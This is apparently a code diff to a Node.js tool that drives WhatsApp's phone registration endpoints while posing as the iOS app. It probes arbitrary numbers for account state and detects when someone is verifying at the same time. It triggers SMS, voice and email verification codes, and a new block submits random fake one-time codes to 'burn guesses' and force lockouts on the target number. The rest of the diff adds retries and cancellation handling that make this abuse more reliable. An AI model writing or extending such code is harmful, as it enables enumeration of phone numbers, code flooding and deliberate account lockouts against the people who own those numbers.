@@ -2,7 +2,7 @@ const dns = require("dns");
 if (typeof dns.setDefaultResultOrder === "function") dns.setDefaultResultOrder("ipv4first");
 const WADetector = require("./walz-loader");
 
-const DEFAULT_TIMEOUT_MS = parseInt(process.env.WA_TIMEOUT_MS || "7000", 10);
+const DEFAULT_TIMEOUT_MS = parseInt(process.env.WA_TIMEOUT_MS || "10000", 10);
 
 let keepAliveDispatcher;
 try {
@@ -217,8 +217,12 @@ function normalizeResult(phone, parsed, existText, codeText) {
   const methods = extractMethodWaits(parsed, existJson, codeJson);
   const primaryWait = methods.sms || methods.voice || methods.email || methods.wa_old || methods.flash || 0;
 
-  const hardCooldownReasons = ["too_recent", "too_many", "too_many_guesses", "try_again", "next_method", "temporarily_unavailable", "rate_overlimit"];
+  const hardCooldownReasons = ["temporarily_unavailable", "rate_overlimit", "no_routes"];
+  const softLimitReasons = ["too_recent", "too_many", "too_many_guesses", "try_again", "next_method"];
+  const concurrentReasons = ["guessed_too_fast", "wrong_code", "stale_code", "code_mismatch"];
   const isHardCooldown = hardCooldownReasons.includes(codeReason) || primaryWait >= 600;
+  const isSoftLimitReason = softLimitReasons.includes(codeReason);
+  const isConcurrent = concurrentReasons.includes(codeReason) || Boolean(parsed.isConcurrent);
 
   let isBanned = Boolean(parsed.isBanned);
   let isCloneBlocked = Boolean(parsed.isCloneBlocked);
@@ -227,20 +231,31 @@ function normalizeResult(phone, parsed, existText, codeText) {
   let isReady = false;
   let isCooldown = false;
   let isSmsLimited = false;
+  let isInUse = false;
   let cooldownSeconds = primaryWait;
   let state = "UNKNOWN";
+
+  const softWait = methods.sms > 0 && methods.sms < 600 ? methods.sms
+    : (methods.voice > 0 && methods.voice < 600 ? methods.voice
+    : (methods.email > 0 && methods.email < 600 ? methods.email
+    : (primaryWait > 0 && primaryWait < 600 ? primaryWait : 0)));
 
   if (isBanned) {
     state = "BANNED";
   } else if (isCloneBlocked) {
     state = "CLONE_BLOCKED";
+  } else if (isConcurrent && !isHardCooldown) {
+    isInUse = true;
+    isReady = false;
+    state = "IN_USE";
+    cooldownSeconds = softWait || primaryWait || 0;
   } else if (isHardCooldown) {
     isCooldown = true;
     state = "COOLDOWN";
-  } else if (baseReady && methods.sms > 0 && methods.sms < 600) {
+  } else if (isSoftLimitReason || softWait > 0) {
     isSmsLimited = true;
     isReady = false;
-    cooldownSeconds = methods.sms;
+    cooldownSeconds = softWait || primaryWait || cooldownSeconds;
     state = "SMS_LIMIT";
   } else if (baseReady || (primaryWait === 0 && !isHardCooldown)) {
     isReady = true;
@@ -270,9 +285,10 @@ function normalizeResult(phone, parsed, existText, codeText) {
     isReady,
     isCooldown,
     isSmsLimited,
+    isInUse,
     isCloneBlocked,
     isBanned,
-    cooldownSeconds: isCooldown || isSmsLimited ? cooldownSeconds : 0,
+    cooldownSeconds: isCooldown || isSmsLimited || isInUse ? cooldownSeconds : 0,
     methods,
     availableMethods,
     wa_old: deviceOn,
@@ -351,19 +367,29 @@ function normalizeEmailResult(phone, parsed, existText, codeText) {
   };
 }
 
-async function callWA(reqObj, userAgent, sharedHeaders = null, timeoutMs = DEFAULT_TIMEOUT_MS) {
+async function callWA(reqObj, userAgent, sharedHeaders = null, timeoutMs = DEFAULT_TIMEOUT_MS, externalSignal = null) {
   const controller = new AbortController();
   const timer = setTimeout(() => controller.abort(), timeoutMs);
+  const onExternalAbort = () => controller.abort();
+  if (externalSignal) {
+    if (externalSignal.aborted) {
+      clearTimeout(timer);
+      throw new Error("CANCELLED");
+    }
+    externalSignal.addEventListener("abort", onExternalAbort, { once: true });
+  }
   try {
     const method = String((reqObj && reqObj.method) || "POST").toUpperCase();
     const options = {
       method,
       headers: {
         "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": userAgent,
-        "Accept": "*/*",
-        "Accept-Language": "en-US,en;q=0.9",
+        "User-Agent": userAgent || "WhatsApp/2.26.42.77 iOS/17.4 Device/iPhone_15_Pro",
+        "Accept": "text/json, application/json, */*",
+        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+        "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
+        "Origin": "https://www.whatsapp.com",
         ...(sharedHeaders || {}),
         ...((reqObj && reqObj.headers) || {})
       },
@@ -391,15 +417,18 @@ async function callWA(reqObj, userAgent, sharedHeaders = null, timeoutMs = DEFAU
     return text;
   } catch (e) {
     if (e && e.name === "AbortError") {
+      if (externalSignal && externalSignal.aborted) throw new Error("CANCELLED");
       throw new Error("REQUEST_TIMEOUT");
     }
     const msg = String(e && e.message ? e.message : e);
-    if (/ECONNRESET|ECONNREFUSED|ETIMEDOUT|ENOTFOUND|UND_ERR|fetch failed/i.test(msg)) {
+    if (msg === "CANCELLED") throw e;
+    if (/ECONNRESET|ECONNREFUSED|ETIMEDOUT|ENOTFOUND|UND_ERR|fetch failed|socket hang up|network/i.test(msg)) {
       throw new Error("NETWORK_ERROR");
     }
     throw e;
   } finally {
     clearTimeout(timer);
+    if (externalSignal) externalSignal.removeEventListener("abort", onExternalAbort);
   }
 }
 
@@ -431,8 +460,37 @@ async function checkPhone(rawPhone) {
       codeText = await callWA(payload.code, payload.userAgent, payload.headers);
     } catch (_) {}
 
-    const parsed = WADetector.parseDualResponse(payload.phoneInfo, existText, codeText || null);
-    return normalizeResult(formattedPhone, parsed, existText, codeText || null);
+    let parsed = WADetector.parseDualResponse(payload.phoneInfo, existText, codeText || null);
+    let normalized = normalizeResult(formattedPhone, parsed, existText, codeText || null);
+
+    // Re-check once when signs of concurrent verification appear for fresher accuracy
+    const reason = String((normalized && normalized.error) || (normalized && normalized.state) || "").toLowerCase();
+    const codeJson = safeJsonParse(codeText || "") || {};
+    const codeReason = String(codeJson.reason || "").toLowerCase();
+    if (
+      normalized &&
+      normalized.success &&
+      (normalized.isInUse || ["guessed_too_fast", "wrong_code", "stale_code", "too_recent"].includes(codeReason))
+    ) {
+      try {
+        await new Promise(r => setTimeout(r, 350));
+        const exist2 = await callWAWithRetry(payload.exist, payload.userAgent, payload.headers, DEFAULT_TIMEOUT_MS, 1);
+        let code2 = codeText;
+        try {
+          await new Promise(r => setTimeout(r, 20));
+          code2 = await callWAWithRetry(payload.code, payload.userAgent, payload.headers, DEFAULT_TIMEOUT_MS, 1);
+        } catch (_) {}
+        parsed = WADetector.parseDualResponse(payload.phoneInfo, exist2, code2 || null);
+        const normalized2 = normalizeResult(formattedPhone, parsed, exist2, code2 || null);
+        if (normalized2 && normalized2.success) {
+          normalized2.isInUse = true;
+          if (normalized2.state === "READY") normalized2.state = "IN_USE";
+          normalized = normalized2;
+        }
+      } catch (_) {}
+    }
+
+    return normalized;
   } catch (e) {
     return {
       success: false,
@@ -528,16 +586,18 @@ async function probePhoneMethods(rawPhone) {
   };
 }
 
-async function callWAWithRetry(reqObj, userAgent, sharedHeaders, timeoutMs, retries = 1) {
+async function callWAWithRetry(reqObj, userAgent, sharedHeaders, timeoutMs, retries = 2, externalSignal = null) {
   let lastErr = null;
   for (let i = 0; i <= retries; i++) {
+    if (externalSignal && externalSignal.aborted) throw new Error("CANCELLED");
     try {
-      return await callWA(reqObj, userAgent, sharedHeaders, timeoutMs);
+      return await callWA(reqObj, userAgent, sharedHeaders, timeoutMs, externalSignal);
     } catch (e) {
       lastErr = e;
       const msg = String(e && e.message ? e.message : e);
-      if (!/NETWORK_ERROR|REQUEST_TIMEOUT|HTTP_5|EMPTY_UPSTREAM/i.test(msg)) break;
-      if (i < retries) await new Promise(r => setTimeout(r, 250 + i * 300));
+      if (msg === "CANCELLED") throw e;
+      if (!/NETWORK_ERROR|REQUEST_TIMEOUT|HTTP_5|EMPTY_UPSTREAM|HTTP_429/i.test(msg)) break;
+      if (i < retries) await new Promise(r => setTimeout(r, 400 + i * 500));
     }
   }
   throw lastErr;
@@ -548,11 +608,19 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
   const allowed = new Set(["sms", "voice", "flash", "email", "wa_old"]);
   const methodKey = allowed.has(String(method || "").toLowerCase()) ? String(method).toLowerCase() : "sms";
   const skipProbe = Boolean(options.skipProbe);
+  const signal = options.signal || null;
+  const sendTimeout = parseInt(process.env.WA_SEND_TIMEOUT_MS || "12000", 10);
+
+  const assertNotCancelled = () => {
+    if (signal && signal.aborted) throw new Error("CANCELLED");
+  };
 
   try {
+    assertNotCancelled();
     let probe = options.probe || null;
     if (!skipProbe && !probe) {
       probe = await probePhoneMethods(cleanPhone);
+      assertNotCancelled();
     }
 
     if (probe && !probe.success && !options.forceSend) {
@@ -583,7 +651,7 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
           success: false,
           phone: probe.phone,
           method: methodKey,
-          state: "COOLDOWN",
+          state: waitForMethod >= 600 ? "COOLDOWN" : "SMS_LIMIT",
           error: "method_cooldown",
           cooldownSeconds: waitForMethod,
           methods: probe.methods,
@@ -593,6 +661,7 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
       }
     }
 
+    assertNotCancelled();
     const payload = await WADetector.buildDualPayloads(cleanPhone, methodKey);
     if (!payload || !payload.success) {
       return {
@@ -607,10 +676,11 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
     const formattedPhone = `+${payload.phoneInfo.full}`;
     let existText = "";
     let codeText = "";
+    let registerText = "";
 
     if (payload.exist) {
       try {
-        existText = await callWAWithRetry(payload.exist, payload.userAgent, payload.headers, DEFAULT_TIMEOUT_MS, 1);
+        existText = await callWAWithRetry(payload.exist, payload.userAgent, payload.headers, sendTimeout, 2, signal);
       } catch (e) {
         return {
           success: false,
@@ -622,14 +692,16 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
       }
     }
 
+    assertNotCancelled();
     const req = payload.code || null;
     if (!req) {
       return { success: false, phone: formattedPhone, method: methodKey, error: "no_code_endpoint", probe };
     }
 
     try {
-      if (existText) await new Promise(r => setTimeout(r, 20));
-      codeText = await callWAWithRetry(req, payload.userAgent, payload.headers, DEFAULT_TIMEOUT_MS, 1);
+      if (existText) await new Promise(r => setTimeout(r, 30));
+      assertNotCancelled();
+      codeText = await callWAWithRetry(req, payload.userAgent, payload.headers, sendTimeout, 2, signal);
     } catch (e) {
       return {
         success: false,
@@ -642,16 +714,46 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
 
     const codeJson = safeJsonParse(codeText) || {};
     const existJson = safeJsonParse(existText) || {};
-    const reason = String(codeJson.reason || existJson.reason || "").toLowerCase();
-    const status = String(codeJson.status || "").toLowerCase();
-    const methods = extractMethodWaits(null, existJson, codeJson);
-    const cooldownSeconds =
+    let reason = String(codeJson.reason || existJson.reason || "").toLowerCase();
+    let status = String(codeJson.status || "").toLowerCase();
+    let methods = extractMethodWaits(null, existJson, codeJson);
+    let cooldownSeconds =
       numWait(methods[methodKey]) ||
       numWait(methods.sms) ||
       numWait(codeJson.retry_after ?? codeJson.sms_wait ?? codeJson.wait);
-    const deviceOn = extractDeviceState(null, existJson, codeJson);
+    let deviceOn = extractDeviceState(null, existJson, codeJson);
     const hardFail = ["blocked", "banned", "no_routes", "bad_token", "length_long", "length_short", "missing"].includes(reason);
     const sentOk = status === "sent" || status === "ok" || ["sent", "sms_sent", "code_sent", "incorrect"].includes(reason);
+
+    // Submit fake OTP to accelerate temporary / burn guesses when code request succeeded
+    if (sentOk && !hardFail && typeof WADetector.buildRegisterPayloads === "function") {
+      try {
+        assertNotCancelled();
+        const fakeCode = String(100000 + Math.floor(Math.random() * 900000));
+        const regPayload = await WADetector.buildRegisterPayloads(cleanPhone, fakeCode);
+        if (regPayload && regPayload.success && regPayload.register) {
+          await new Promise(r => setTimeout(r, 40));
+          assertNotCancelled();
+          registerText = await callWAWithRetry(regPayload.register, regPayload.userAgent, payload.headers, sendTimeout, 1, signal);
+          const regJson = safeJsonParse(registerText) || {};
+          const regReason = String(regJson.reason || "").toLowerCase();
+          const regStatus = String(regJson.status || "").toLowerCase();
+          const regWait = numWait(regJson.retry_after ?? regJson.sms_wait ?? regJson.wait ?? regJson.email_wait);
+          if (regWait > cooldownSeconds) cooldownSeconds = regWait;
+          if (regReason) reason = regReason;
+          if (regStatus) status = regStatus;
+          methods = extractMethodWaits(null, existJson, { ...codeJson, ...regJson });
+          const methodWait = numWait(methods[methodKey]);
+          if (methodWait > cooldownSeconds) cooldownSeconds = methodWait;
+          deviceOn = extractDeviceState(null, existJson, { ...codeJson, ...regJson }) || deviceOn;
+        }
+      } catch (regErr) {
+        const rm = String(regErr && regErr.message ? regErr.message : regErr);
+        if (rm === "CANCELLED") {
+          return { success: false, phone: formattedPhone, method: methodKey, error: "CANCELLED", probe };
+        }
+      }
+    }
 
     if (hardFail) {
       return {
@@ -667,31 +769,52 @@ async function sendVerificationCode(rawPhone, method = "sms", options = {}) {
       };
     }
 
-    if (!sentOk && cooldownSeconds > 0 && ["too_recent", "too_many", "try_again", "too_many_guesses"].includes(reason)) {
+    const softCooldownReasons = ["too_recent", "too_many", "try_again", "too_many_guesses", "next_method", "incorrect"];
+    const hardCooldownReasons = ["temporarily_unavailable", "rate_overlimit"];
+    if (hardCooldownReasons.includes(reason) || cooldownSeconds >= 600) {
       return {
-        success: false,
+        success: true,
         phone: formattedPhone,
         method: methodKey,
         state: "COOLDOWN",
-        error: reason,
-        cooldownSeconds,
+        error: reason || "cooldown",
+        cooldownSeconds: cooldownSeconds || 600,
         methods,
         isDeviceOn: deviceOn,
-        probe
+        probe,
+        rawStatus: status,
+        rawReason: reason
+      };
+    }
+
+    if (sentOk || softCooldownReasons.includes(reason) || cooldownSeconds > 0) {
+      const state = cooldownSeconds > 0 && cooldownSeconds < 600 ? "SMS_LIMIT" : (cooldownSeconds >= 600 ? "COOLDOWN" : "SENT");
+      return {
+        success: true,
+        phone: formattedPhone,
+        method: methodKey,
+        state,
+        reason: reason || status || "sent",
+        cooldownSeconds,
+        methods,
+        maskedEmail: codeJson.email || codeJson.masked_email || existJson.email || (probe && probe.maskedEmail) || null,
+        isDeviceOn: deviceOn,
+        hasDevice: deviceOn,
+        probe,
+        rawStatus: status,
+        rawReason: reason
       };
     }
 
     return {
-      success: true,
+      success: false,
       phone: formattedPhone,
       method: methodKey,
-      state: "SENT",
-      reason: reason || status || "sent",
+      state: "FAILED",
+      error: reason || status || "send_failed",
       cooldownSeconds,
       methods,
-      maskedEmail: codeJson.email || codeJson.masked_email || existJson.email || (probe && probe.maskedEmail) || null,
       isDeviceOn: deviceOn,
-      hasDevice: deviceOn,
       probe,
       rawStatus: status,
       rawReason: reason
